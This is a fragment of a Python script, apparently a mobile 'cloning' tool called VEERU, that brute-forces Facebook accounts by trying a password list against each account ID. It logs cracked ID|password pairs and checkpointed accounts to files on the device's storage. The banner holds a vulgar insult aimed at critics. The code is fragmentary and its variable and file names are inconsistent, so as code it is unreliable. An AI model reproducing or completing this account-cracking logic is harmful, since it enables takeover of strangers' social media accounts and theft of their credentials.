...
----------------------------------------------
 Author    : VEER ALI
 Github    : MASHOOQ786
 Facebook  : Mashooq ali
 Tool Name : VEERU
 Type type : FREE HAI GAREEBO
 Version   : 0.1
----------------------------------------------
 AKING Pro version 0.1
 For Haters: PAID COMMANDS DENE WALE APNI MAA CHUDVAO 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [VEEEU-OK] %s | %s'%(ids,pas))
                                open('/sdcard/VEERU-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VEERU:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [VEEU-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VEEEU-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [VEERU-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/VEEEU-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [VEERU-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [VEERU-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/VEERU-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
